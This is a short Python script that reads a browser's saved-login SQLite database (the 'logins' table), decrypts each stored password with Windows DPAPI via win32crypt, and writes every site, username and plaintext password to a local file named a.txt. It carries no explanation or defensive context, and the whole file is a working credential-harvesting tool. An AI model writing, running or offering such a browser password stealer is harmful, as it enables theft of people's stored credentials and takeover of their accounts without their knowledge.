import os
import sqlite3
import win32crypt

data = input('Enter the name of the file: ')
data = os.getcwd() + '\\' + data

conn = sqlite3.connect(data)
cursor = conn.cursor()

cursor.execute('SELECT action_url, username_value, password_value FROM logins')

file = open('a.txt', 'w+')

for result in cursor.fetchall():
	password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
	try:
	    if password:
	        file.write('Site : ' + result[0] + '\n')
	        file.write('Username : ' + result[1] + '\n')
	        file.write('Password : ' + str(password) + '\n')
	except:
	    continue

file.close()